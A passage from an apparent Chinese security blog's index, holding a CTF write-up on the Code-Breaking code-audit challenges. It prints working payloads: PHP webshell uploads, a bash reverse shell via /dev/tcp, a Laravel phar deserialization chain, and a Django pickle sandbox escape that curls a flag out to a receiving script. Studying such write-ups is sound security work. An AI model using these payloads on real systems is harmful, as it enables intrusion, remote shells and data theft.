        <tag>wp</tag>
        <tag>SQL</tag>
        <tag>buuoj</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CodeBreaking 代码审计]]></title>
    <url>%2F2019%2F09%2F14%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[CodeBreaking : https://code-breaking.com/ 在线正则表达式匹配 : https://regex101.com/ 根据已有的大佬们的 wp 对 code breaking 做的一个复现，很多内容都是第一次接触，对涉及到的知识点做些总结和拓展。 function create_function 注入 源码 12345678&lt;?php$action = $_GET['action'] ?? '';$arg = $_GET['arg'] ?? '';if(preg_match('/^[a-z0-9_]*$/isD', $action)) &#123; show_source(__FILE__);&#125; else &#123; $action('', $arg);&#125; 正则 /i 不区分大小写，/s 匹配任何不可见字符，包括空格，TAB，换行，/D 如果使用 $ 限制结尾字符，则不允许结尾有换行 preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action) 匹配所有字母，数字和下划线开头的字符串 想通过 fuzz 找到字符串以达到 bypass 的目的 123456789101112131415import requestsurl_start = 'http://192.168.233.132:8087/?action='url_end = 'var_dump&amp;arg=2'for i in range(1,256): i = chr(i).encode() para = i.hex() url = url_start + '%' + str(para) + url_end r = requests.get(url=url) # 不出现 error 且 不返回 index.php if (r.headers['Content-Length'] != '279') and ('error' not in r.text): print(para) 找到了 %5c，即 \，可以让 var_dump 成功执行，ph 牛给了如下的解释。接下来就是 getshell 函数的寻找，要有两个参数且第二个参数可能会导致 RCE php 里默认命名空间是 \，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名 function_name() 调用，调用的时候其实相当于写了一个相对路径；而如果写 \function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 不难发现函数 create_function，官方定义如图 以如下代码为例 12345678&lt;?php$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');echo "New anonymous function: $newfunc\n";echo $newfunc(2, M_E) . "\n";// outputs// New anonymous function: lambda_1// ln(2) + ln(2.718281828459) = 1.6931471805599?&gt; 第一行代码等价于 12345eval(function __lambda_func($a, $b)&#123; return "ln($a) + ln($b) = " . log($a * $b); &#125;) 本题就可以构造 payload : action=\create_function&amp;arg=return &#39;peri0d&#39;;}var_dump(scandir(&#39;../&#39;));/*，然后 readfile(flag) 即可 相当于 123456eval(function __lambda_func($a, $b)&#123; return 'peri0d';&#125; var_dump(scandir('../')); /*&#125;) pcrewaf PCRE 回溯次数限制绕过正则 源码 1234567891011121314151617181920&lt;?phpfunction is_php($data)&#123; return preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data);&#125;if(empty($_FILES)) &#123; die(show_source(__FILE__));&#125;$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);$data = file_get_contents($_FILES['file']['tmp_name']);if (is_php($data)) &#123; echo "bad request";&#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . '/' . random_int(0, 10) . '.php'; move_uploaded_file($_FILES['file']['tmp_name'], $path); header("Location: $path", true, 303);&#125; 上传文件，使用正则判断是否含有 php 代码，正则 /i 不区分大小写，/s 匹配任何不可见字符，包括空格，TAB，换行。 如果不含有 php 代码，上传的文件会被保存，并在 http 中重定向到文件路径 常见的正则引擎有两种，DFA 和 NFA，php 中的 PCRE 库使用的是 NFA， DFA : 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入 NFA : 从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态 假设待匹配字符串 &lt;?php phpinfo();//aaaaa 匹配顺序如下图 : 在第四步，由于匹配的是 .* 任意多个字符，所以匹配到最后 按照正则，在 .* 后面应该是 [(`;?&gt;] ，显然 //aaaaa 不对，所以依次吐出这几个字符，即回溯，这里总共回溯了 8 次，回溯到 ; 时 .* 匹配的是 &lt;?php phpinfo() ，后面的 ; 符合 [(`;?&gt;] ，所以匹配 ; ，然后正则最后的 .* 匹配到最后 php 有一个回溯上限 backtrack_limit ，默认是 1000000。如果回溯上限超过 100 万那么 preg_match 返回 false ，既不是 1 也不是 0 ，这样就可以绕过了 对应 poc : 12345678910111213import requestsfrom io import BytesIOurl = 'http://192.168.233.132:8088/index.php'files = &#123; 'file': BytesIO(b'&lt;?php eval($_POST[shell]);//' + b'a'*1000000)&#125;# 请求并禁止重定向r = requests.post(url=url, files=files, allow_redirects=False)print(r.headers) 可以获取 shell 位置，连接即可 如下一个 waf : 1234&lt;?phpif(preg_match('/UNION.+?SELECT/is', $input)) &#123; die('SQL Injection');&#125; 输入 UNION/*aaaaa*/SELECT ，这个正则表达式执行流程如下 正则先匹配 UNION，然后 .+? 匹配 / 由于是非贪婪匹配，匹配最短字符，所以只匹配到 / 就停止 接着 S 匹配 * ，匹配失败，回溯，由 .+? 匹配 * ，成功 重复上一步，直到匹配结束 这里也可以利用回溯次数限制绕过正则 preg_match 返回的是匹配到的次数，如果匹配不到会返回 0 ，如果报错就会返回 false 。所以，对 preg_match 来说，只要对返回结果有判断，就可以避免这样的问题 phpmagic 伪协议解码 base64 写入 shell 代码如下 12345678910111213141516171819202122232425262728&lt;?phpif(isset($_GET['read-source'])) &#123; exit(show_source(__FILE__));&#125;define('DATA_DIR', dirname(__FILE__) . '/data/' . md5($_SERVER['REMOTE_ADDR']));if(!is_dir(DATA_DIR)) &#123; mkdir(DATA_DIR, 0755, true);&#125;chdir(DATA_DIR);$domain = isset($_POST['domain']) ? $_POST['domain'] : '';$log_name = isset($_POST['log']) ? $_POST['log'] : date('-Y-m-d');if(!empty($_POST) &amp;&amp; $domain)&#123; $command = sprintf("dig -t A -q %s", escapeshellarg($domain)); $output = shell_exec($command); $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES); $log_name = $_SERVER['SERVER_NAME'] . $log_name; if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'], true)) &#123; file_put_contents($log_name, $output); &#125;echo $output;&#125;endif; ?&gt; $_SERVER[&#39;REMOTE_ADDR&#39;] 获取浏览当前页面的用户的 IP 地址，在 data 下创建文件夹，用于存储 output $domain 和 $log 两个参数可控，$domain 用于 dig 命令，$log 用于将结果写入 在 php 中，只要是传 filename 的地方，都可以传协议流 思路就是 $log_name 处利用伪协议将 $output 处的字符串 base64 解码写入 webshell $_SERVER[&#39;SERVER_NAME&#39;] 获取当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。这个值可以更改，由 HTTP Header 中的 Host 决定。 pathinfo() 函数过滤后缀名，但是，只要在后缀名后加上 /. ，它就获取不到后缀名了，且可以正常写入 .php 之中。php 在处理路径的时候，会递归删除掉路径中存在的 /. php 伪协议 base64 解码中，如果遇到不合规范的字符就直接跳过。base64 解码是按照 4 位解的，所以要只有传入 4 的倍数位字符串才能解码为正常字符串，且传入的 base64 不能以 == 结尾，== 出现在 base64 中间不符合规则，可能会无法解析 payload : 1234POSTHost: phpdomain=YWFhYTw/cGhwIGV2YWwoJF9QT1NUWydzaGVsbCddKTsgLy8q&amp;log=://filter/write=convert.base64-decode/resource=/var/www/html/data/daa6b8b28b2eda419112a887399ce9fc/shell.php/. 结果 : phplimit 无参 RCE 代码如下 : 123456&lt;?phpif(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) &#123; eval($_GET['code']);&#125; else &#123; show_source(__FILE__);&#125; ciscn 2019 和 rctf 2018 的题目，统计一下这一题的解法，主要是 get_defined_vars() 和 session_id() 两个函数 preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])，\W 匹配任意字母和数字，(?R)? 重复整个模式，?R 是 php 中的一种递归模式，合在一起类似于匹配 x(y(z())) 样式的，且不能存在参数，输入 ?code=phpinfo(); 可以查看 phpinfo 页面 在 rctf 2018 的题目中使用的是 apache 的容器，在本题使用 nginx 容器，都是考虑通过修改请求头信息来实现 RCE 在 apache 中可以使用 getallheaders() 获取所有头信息，而在 nginx 中可以使用 get_defined_vars() 函数获取所有已定义的变量列表，然后就可以通过位置函数来操控数组 session_id() 可以获取 PHPSESSID，虽然 PHPSESSID 只允许字母数字和下划线出现，hex2bin 转换一下编码即可 几个 payload : 123456789// 第一个?code=eval(hex2bin(session_id(session_start()))); // echo 'peri0d';Cookie: PHPSESSID=6563686f2027706572693064273b//第二个?code=eval(end(current(get_defined_vars())));&amp;a=var_dump(scandir('../'));//第三个?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); nodechr js 的题目，关于 javascript 的大小写特性，两个函数 toLowerCase() 和 toLowerCase() 代码如下 : 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103// initial librariesconst Koa = require('koa')const sqlite = require('sqlite')const fs = require('fs')const views = require('koa-views')const Router = require('koa-router')const send = require('koa-send')const bodyParser = require('koa-bodyparser')const session = require('koa-session')const isString = require('underscore').isStringconst basename = require('path').basenameconst config = JSON.parse(fs.readFileSync('../config.json', &#123;encoding: 'utf-8', flag: 'r'&#125;))async function main() &#123; const app = new Koa() const router = new Router() const db = await sqlite.open(':memory:') await db.exec(`CREATE TABLE "main"."users" ( "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, "username" TEXT NOT NULL, "password" TEXT, CONSTRAINT "unique_username" UNIQUE ("username") )`) await db.exec(`CREATE TABLE "main"."flags" ( "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, "flag" TEXT NOT NULL )`) for (let user of config.users) &#123; await db.run(`INSERT INTO "users"("username", "password") VALUES ('$&#123;user.username&#125;', '$&#123;user.password&#125;')`) &#125; await db.run(`INSERT INTO "flags"("flag") VALUES ('$&#123;config.flag&#125;')`) router.all('login', '/login/', login).get('admin', '/', admin).get('static', '/static/:path(.+)', static).get('/source', source) app.use(views(__dirname + '/views', &#123; map: &#123; html: 'underscore' &#125;, extension: 'html' &#125;)).use(bodyParser()).use(session(app)) app.use(router.routes()).use(router.allowedMethods()); app.keys = config.signed app.context.db = db app.context.router = router app.listen(3000)&#125;function safeKeyword(keyword) &#123; if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\-\-)/is)) &#123; return keyword &#125; return undefined&#125;async function login(ctx, next) &#123; if(ctx.method == 'POST') &#123; let username = safeKeyword(ctx.request.body['username']) let password = safeKeyword(ctx.request.body['password']) let jump = ctx.router.url('login') if (username &amp;&amp; password) &#123; let user = await ctx.db.get(`SELECT * FROM "users" WHERE "username" = '$&#123;username.toUpperCase()&#125;' AND "password" = '$&#123;password.toUpperCase()&#125;'`) if (user) &#123; ctx.session.user = user jump = ctx.router.url('admin') &#125; &#125; ctx.status = 303 ctx.redirect(jump) &#125; else &#123; await ctx.render('index') &#125;&#125;async function static(ctx, next) &#123; await send(ctx, ctx.path)&#125;async function admin(ctx, next) &#123; if(!ctx.session.user) &#123; ctx.status = 303 return ctx.redirect(ctx.router.url('login')) &#125; await ctx.render('admin', &#123; 'user': ctx.session.user &#125;)&#125;async function source(ctx, next) &#123; await send(ctx, basename(__filename))&#125;main() 关键代码在于 safeKeyword() 函数，过滤了 union 和 select 1234567function safeKeyword(keyword) &#123; if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\-\-)/is)) &#123; return keyword &#125; return undefined&#125; p 牛在博客中提到过如下特性，但是也适用于 python 中，这样就可以绕过保护函数，达到注入的目的 “ ı “.toUpperCase() == ‘ I ‘ “ ſ “.toUpperCase() == ‘ S ‘ “ K “.toLowerCase() == ‘ k ‘ payload : 12POSTusername=peri0d&amp;password=' un%C4%B1on %C5%BFelect 1,(%C5%BFelect flag from flags),3' javacon EI 表达式注入，http://rui0.cn/archives/1043 基础知识 SpEL 注入 Java 反射机制 Linux 反弹 shell 目录结构如下 SpringBoot 框架，看了一下 Spring 表达式 123456789101112131415161718public class HelloWorld &#123; public static void main(String[] args) &#123; //构造上下文：准备比如变量定义等等表达式运行需要的上下文数据 EvaluationContext context = new StandardEvaluationContext(); //创建解析器：提供SpelExpressionParser默认实现 ExpressionParser parser = new SpelExpressionParser(); //解析表达式：使用ExpressionParser来解析表达式为相应的Expression对象 Expression expression = parser.parseExpression("('Hello' + ' World').concat(#end)"); //设置上下文中的变量的值 context.setVariable("end", "!SpringEL"); //执行表达式，获取运行结果 String str = (String)expression.getValue(context); // the str=Hello World!SpringEL System.out.println("the str="+str); &#125; &#125; 先看配置文件 application.yml，提供了一个黑名单和用户列表 1234567891011121314spring: thymeleaf: encoding: UTF-8 cache: false mode: HTMLkeywords: blacklist: - java.+lang - Runtime - exec.*\(user: username: admin password: admin rememberMeKey: c0dehack1nghere1 文件结构 : SmallEvaluationContext.java 实现构造上下文的功能 ChallengeApplication.java 实现启动功能 Encryptor.java 实现 AES 加解密 KeyworkProperties.java 实现黑名单 UserConfig.java 实现用户模型，其中的 RememberMe 用到了 Encryptor MainController.java 控制程序的主要逻辑 主要看 MainController.java 中的代码，在 login 功能处，如果勾选 Remember me 就会返回一个加密之后的 cookie，然后跳转到 hello.html 12345678910111213141516171819@PostMapping("/login") public String login(@RequestParam(value = "username", required = true) String username, @RequestParam(value = "password", required = true) String password, @RequestParam(value = "remember-me", required = false) String isRemember, HttpSession session, HttpServletResponse response) &#123; if (userConfig.getUsername().contentEquals(username) &amp;&amp; userConfig.getPassword().contentEquals(password)) &#123; session.setAttribute("username", username); if (isRemember != null &amp;&amp; !isRemember.equals("")) &#123; Cookie c = new Cookie("remember-me", userConfig.encryptRememberMe()); c.setMaxAge(60 * 60 * 24 * 30); response.addCookie(c); &#125; return "redirect:/"; &#125; return "redirect:/login-error"; &#125; 对敏感信息 cookie 的操作如下，首先判断 remember-me 是否存在，然后获取其值进行解密，直接将它赋值给 username，接下来就是使用 getAdvanceValue() 这个自定义函数赋值给 name 1234567891011121314151617@GetMapping public String admin(@CookieValue(value = "remember-me", required = false) String rememberMeValue,HttpSession session,Model model) &#123; if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals("")) &#123; String username = userConfig.decryptRememberMe(rememberMeValue); if (username != null) &#123; session.setAttribute("username", username); &#125; &#125; Object username = session.getAttribute("username"); if(username == null || username.toString().equals("")) &#123; return "redirect:/login"; &#125; model.addAttribute("name", getAdvanceValue(username.toString())); return "hello"; &#125; getAdvanceValue 函数如下，就是与黑名单匹配，如果匹配则抛出 FORBIDDEN，否则进行正常的 SpEL 解析 12345678910111213private String getAdvanceValue(String val) &#123; for (String keyword: keyworkProperties.getBlacklist()) &#123; Matcher matcher = Pattern.compile(keyword, Pattern.DOTALL | Pattern.CASE_INSENSITIVE).matcher(val); if (matcher.find()) &#123; throw new HttpClientErrorException(HttpStatus.FORBIDDEN); &#125; &#125; ParserContext parserContext = new TemplateParserContext(); Expression exp = parser.parseExpression(val, parserContext); SmallEvaluationContext evaluationContext = new SmallEvaluationContext(); return exp.getValue(evaluationContext).toString(); &#125; 这里就是 SpEL 注入实现 RCE 了，在不指定 EvaluationContext 时，默认采用的是 StandardEvaluationContext ，这里还进行了黑名单匹配，利用反射就可以绕过黑名单 在 JAVA 中，通过 java.lang.Runtime.getRuntime().exec(cmd) 来执行命令，这里可以利用反射写一个反弹 shell 来 getshell，构造 payload 如下 : 1#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/192.168.233.130/2333 0&gt;&amp;1"&#125;)&#125; 加密之后修改 cookie 发送 123456789import static net.mindview.util.Print.*;public class sss &#123; public static void main(String[] args) &#123; String x = "#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"/bin/bash\",\"-c\",\"bash -i &gt;&amp; /dev/tcp/192.168.233.130/2333 0&gt;&amp;1\"&#125;)&#125;"; String y = Encryptor.encrypt("c0dehack1nghere1", "0123456789abcdef", x); print(y); &#125;&#125; 实现反弹 shell lumenserial 寻找 POP 链，phar 反序列化，GitHub 给的 docker 环境好像有点问题 https://github.com/phith0n/code-breaking/blob/master/2018/lumenserial 首先看一下路由信息，当访问 /server/editor 时会调用 App\Http\Controllers 的 main 方法 12$router-&gt;get('/server/editor', 'EditorController@main');$router-&gt;post('/server/editor', 'EditorController@main'); 进入 EditorController.php 文件，存在 doUploadImage，doCatchimage，doListImage，doConfig 的功能。进入 main，从 url 获取 action 参数，如果 action 存在就执行这个函数，返回结果均为 json 格式 12345678910111213public function main(Request $request)&#123; $action = $request-&gt;query('action'); try &#123; if (is_string($action) &amp;&amp; method_exists($this, "do&#123;$action&#125;")) &#123; return call_user_func([$this, "do&#123;$action&#125;"], $request); &#125; else &#123; throw new FileException('Method error'); &#125; &#125; catch (FileException $e) &#123; return response()-&gt;json(['state' =&gt; $e-&gt;getMessage()]); &#125;&#125; 在 download 函数中，$url 未经过滤就传给了 file_get_contents，而 $url 源自 doCatchimage 中的 $request-&gt;input($this-&gt;config[&#39;catcherFieldName&#39;])，查看配置文件 /resources/editor/config.json 就可以知道其值为 source，也就是 url 中的 source 参数，然后就可以利用 phar 反序列化 1234567891011121314protected function doCatchimage(Request $request)&#123; $sources = $request-&gt;input($this-&gt;config['catcherFieldName']); $rets = []; if ($sources) &#123; foreach ($sources as $url) &#123; $rets[] = $this-&gt;download($url); &#125; &#125; return response()-&gt;json([ 'state' =&gt; 'SUCCESS', 'list' =&gt; $rets ]);&#125; 可以直接根据已有的 payload 构造反序列化 https://xz.aliyun.com/t/6059 exp : 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phpnamespace Illuminate\Broadcasting &#123; class PendingBroadcast &#123; protected $events; protected $event; function __construct($evilCode) &#123; $this-&gt;events = new \Illuminate\Bus\Dispatcher(); $this-&gt;event = new BroadcastEvent($evilCode); &#125; &#125; class BroadcastEvent &#123; public $connection; function __construct($evilCode) &#123; $this-&gt;connection = new \Mockery\Generator\MockDefinition($evilCode); &#125; &#125;&#125;namespace Illuminate\Bus &#123; class Dispatcher &#123; protected $queueResolver; function __construct() &#123; $this-&gt;queueResolver = [new \Mockery\Loader\EvalLoader(), 'load']; &#125; &#125;&#125;namespace Mockery\Loader &#123; class EvalLoader &#123;&#125;&#125;namespace Mockery\Generator &#123; class MockDefinition &#123; protected $config; protected $code; function __construct($evilCode) &#123; $this-&gt;code = $evilCode; $this-&gt;config = new MockConfiguration(); &#125; &#125; class MockConfiguration &#123; protected $name = 'abcdefg'; &#125;&#125;namespace &#123; $code = "&lt;?php phpinfo(); exit; ?&gt;"; $exps = new \Illuminate\Broadcasting\PendingBroadcast($code); $p = new Phar('exp.phar', 0, 'exp.phar'); $p-&gt;startBuffering(); $p-&gt;setStub('GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'); $p-&gt;setMetadata($exps); $p-&gt;addFromString('1.txt','text'); $p-&gt;stopBuffering();&#125;?&gt; picklecode python 反序列化，Django 模板引擎沙箱 基础知识 : python 反序列化 通常代码审计先看配置文件，Django 配置文件 web/core/setting.py，发现如下代码 : 12SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'SESSION_SERIALIZER = 'core.serializer.PickleSerializer' 一般默认的 Django 配置文件是不含这两项的，SESSION_ENGINE 是用户 session 存储的位置，SESSION_SERIALIZER 是 session 存储的方式。用户的 session 先经过 SESSION_SERIALIZER 处理成一个字符串后存储到 SESSION_ENGINE 指定的位置。在这里，就是 session 使用 pickle 的序列化方法，经过签名后存储在 cookies 中，我们所不知道的就是签名的密钥 思路就是获取密钥，pickle 反序列化 阅读路由信息，首先会调用 views.RegistrationLoginView.as_view() 函数，进行登录或者注册之后，在 views.index() 函数中直接将用户名拼接到模板中，也就是说这里存在着 SSTI 漏洞，那就可以利用它获取 SECRET_KEY 12345@login_requireddef index(request): django_engine = engines['django'] template = django_engine.from_string('My name is ' + request.user.username) return HttpResponse(template.render(None, request)) 随意构造一个 username 为 可以看到一个加密后的密码，这就验证了 SSTI 在 /template/registration/login.html 的 csrf_token 处下个断点，可以看到有很多变量，其中有一部分是加载模板的时候传入的，还有一部分是 Django 自带的，可以在 settings.py 中的 templates 查看自带的变量 123456789101112131415TEMPLATES = [ &#123; 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [], 'APP_DIRS': True, 'OPTIONS': &#123; 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], &#125;, &#125;,] 这里的 context_processors 就代表会向模板中注入的一些上下文。通常来说， request 、 user 、和 perms 都是默认存在的，但显然， settings 是不存在的，我们无法直接在模板中读取 settings 中的信息，包括密钥。Django 的模板引擎有一定限制，比如无法读取用下划线开头的属性 经过一番寻找，在 request.user.groups.source_field.opts.app_config.module.admin.settings 处发现 SECRET_KEY ，那就可以构造 username 为 request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY 即可获取签名密钥了 zs%o-mvuihtk6g4pgd+xpa&amp;1hh9%&amp;ulnf!@9qx8_y5kk+7^cvm 接着就是 pickle 的反序列化了，其核心文件为 /core/serializer.py 123456789101112131415161718192021222324252627282930import pickleimport ioimport builtins__all__ = ('PickleSerializer', )class RestrictedUnpickler(pickle.Unpickler): blacklist = &#123;'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'&#125; def find_class(self, module, name): # Only allow safe classes from builtins. if module == "builtins" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))class PickleSerializer(): def dumps(self, obj): return pickle.dumps(obj) def loads(self, data): try: if isinstance(data, str): raise TypeError("Can't load pickle from unicode string") file = io.BytesIO(data) return RestrictedUnpickler(file,encoding='ASCII', errors='strict').load() except Exception as e: return &#123;&#125; 其中设置了一个反序列化沙盒，禁用了 &#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39; 并且只允许调用 python 内置函数 但是 getattr 这个万金油函数没有被限制，那就可以使用 builtins.getattr(builtins,&#39;eval&#39;) 来获取 eval 函数，这就相当于绕过了这个沙盒 首先执行 getattr 获取 eval 函数，再执行 eval 函数，这实际上是两步，而我们常用 __reduce__ 生成的序列化字符串，只能执行一个函数，这就产生矛盾了，所以就要放弃 __reduce__ 直接手写 pickle 代码 pickle 是一种堆栈语言，它没有变量名这个概念，pickle 的内容存储在 stack(栈) 和 memo(存储信息的列表) 中。首先将 payload b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39; 写进一个文件 1234567891011import pickleimport osclass Person(): def __reduce__(self): return (os.system, ('whoami',))person = Person()f = open('pickle','wb')pickle.dump(person ,f, protocol = 0)f.close() 执行 python -m pickletools pickle 对其分析，得到一堆操作指令(opcode) 阅读源码可以获得所有的 opcodes 这段 pickle 代码所涉及到的部分符号意思如下 : 1234567c : 引入模块和对象，模块名和对象名以换行符分割。（find_class校验就在这一步，也就是说，只要c这个OPCODE的参数没有被find_class限制，其他地方获取的对象就不会被沙盒影响了，这也是为什么要用getattr来获取对象）p : 将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引( : 压入一个标志到栈中，表示元组的开始位置V : 向栈中压入一个(unicode)字符串t : 从栈顶开始，找到最上面的一个(，并将(到t中间的内容全部弹出，组成一个元组，再把这个元组压入栈中R : 从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上. : 表示整个程序结束 那么这段 pickle 就很容易懂了 language1234567891000: c GLOBAL &apos;nt system&apos; # 向栈顶压入 &apos;nt.system&apos; 这个可执行对象11: p PUT 0 # 将这个对象存储到 memo 的第 0 个位置14: ( MARK # 压入一个元组的开始标志15: V UNICODE &apos;whoami&apos; # 压入字符串&apos;whoami&apos;23: p PUT 1 # 将这个字符串存储到 memo 的第 1 个位置26: t TUPLE (MARK at 14) # 将由刚压入栈中的字符串弹出，再将由这个字符串组成的元组压入栈中27: p PUT 2 # 将这个元组存储到 memo 的第 2 个位置30: R REDUCE # 从栈上弹出两个元素，分别是可执行对象和元组，并执行，这里即为 &apos;nt.system(&apos;whoami&apos;)&apos; ，将结果压入栈中31: p PUT 3 # 将栈顶的元素(也就是刚才执行的结果)存储到 memo 的第 3 个位置34: . STOP # 程序结束 简化为如下代码，memo 没有起到太大作用，但这段代码仍然可以执行命令 1234ntsystem(VwhoamitR. 接着开始写 pickle 代码 123456789cbuiltins # 将 builtins 设为可执行对象getattr # 获取 getattr 方法(cbuiltins # 压入元组开始标志，并将 builtins 设为可执行对象dict # 获取 dict 对象S&apos;get&apos; # 压入字符串 &apos;get&apos;tR(cbuiltins # 弹出 builtins.dict,get 并组成新的元组压入栈中。然后执行 builtins.getattr(builtins.dict,get) 得到 get 方法压入栈中。再压入元组标志，将 builtins 设为可执行对象globals # 获取 builtins.globals(tRS&apos;builtins&apos; # 压入元组标志，执行 builtins.globals，然后压入字符串 &apos;builtins&apos;tRp1 # 执行 get(builtins)，获取到 builtins 对象存储到 memo[1] 处 python 代码 123456789101112131415161718import pickleimport builtinsdata = b'''cbuiltinsgetattr(cbuiltinsdictS'get'tR(cbuiltinsglobals(tRS'builtins'tRp1.'''data = pickle.loads(data)print(data)# &lt;module 'builtins' (built-in)&gt; 然后利用这个没有限制的 builtins 对象获取危险函数，并执行，这就绕过了沙盒 123456cbuiltins # 将 builtins 设为可执行对象getattr # 获取 getattr 方法(g1 # 压入数组，压入上一步获取的 builtins 对象S&apos;eval&apos; # 压入字符串 &apos;eval&apos;tR(S&apos;__import__(&quot;os&quot;).system(&quot;id&quot;)&apos; # 获取到 eval 函数。将字符串 &apos;__import__(&quot;os&quot;).system(&quot;id&quot;)&apos; 压入tR. # 执行 eval(&apos;__import__(&quot;os&quot;).system(&quot;id&quot;)&apos;) 上面都是绕过的分析，看一下本题有哪些可控点，考虑 SESSIONID ，接下来就看一下源码中对于它的操作 它使用的是 django.contrib.sessions.backends.signed_cookies 直接导入 python 代码 123456789101112131415161718192021222324252627282930313233343536373839import pickleimport builtinsimport ioclass RestrictedUnpickler(pickle.Unpickler): blacklist = &#123;'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'&#125; def find_class(self, module, name): # Only allow safe classes from builtins. if module == "builtins" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))def restricted_loads(s): """Helper function analogous to pickle.loads().""" return RestrictedUnpickler(io.BytesIO(s)).load()data = b'''cbuiltinsgetattr(cbuiltinsdictS'get'tR(cbuiltinsglobals(tRS'builtins'tRp1cbuiltinsgetattr(g1S'eval'tR(S'__import__("os").system("id")'tR..'''data = restricted_loads(data)print(data) 本题的 exp 如下，由于在同一个局域网就在物理机上写了一个接收的 php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from django.core import signingimport pickleimport builtins,ioimport base64import datetimeimport jsonimport reimport timeimport zlibdata = b'''cbuiltinsgetattr(cbuiltinsdictS'get'tR(cbuiltinsglobals(tRS'builtins'tRp1cbuiltinsgetattr(g1S'eval'tR(S'__import__("os").system("curl http://192.168.0.100/xss/xss.php?$(cat /flag_djang0_p1ckle | base64)")'tR.'''def b64_encode(s): return base64.urlsafe_b64encode(s).strip(b'=')def pickle_exp(SECRET_KEY): global data is_compressed = False compress = False if compress: # Avoid zlib dependency unless compress is being used compressed = zlib.compress(data) if len(compressed) &lt; (len(data) - 1): data = compressed is_compressed = True base64d = b64_encode(data).decode() if is_compressed: base64d = '.' + base64d SECRET_KEY = SECRET_KEY # 根据SECRET_KEY进行Cookie的制造 session = signing.TimestampSigner(key = SECRET_KEY,salt='django.contrib.sessions.backends.signed_cookies').sign(base64d) print(session)if __name__ == '__main__': SECRET_KEY = 'zs%o-mvuihtk6g4pgd+xpa&amp;1hh9%&amp;ulnf!@9qx8_y5kk+7^cvm' pickle_exp(SECRET_KEY) xss.php 123456789&lt;?php$data = fopen("cookies.txt","a+");foreach ($_GET as $key=&gt;$value) &#123; fwrite($data, $key.":".$value); fwrite($data, "\n");&#125;?&gt; thejs JS 原型污染，没找到对应源码 Node.js原型污染攻击的分析与利用 深入理解JavaScript Prototype污染攻击 一个题解]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>CodeBreaking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[code-breaking picklecode中对signed_cookies引擎分析]]></title>
    <url>%2F2019%2F09%2F12%2Fcode-breaking%20picklecode%E4%B8%AD%E5%AF%B9signed_cookies%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90%2F</url>
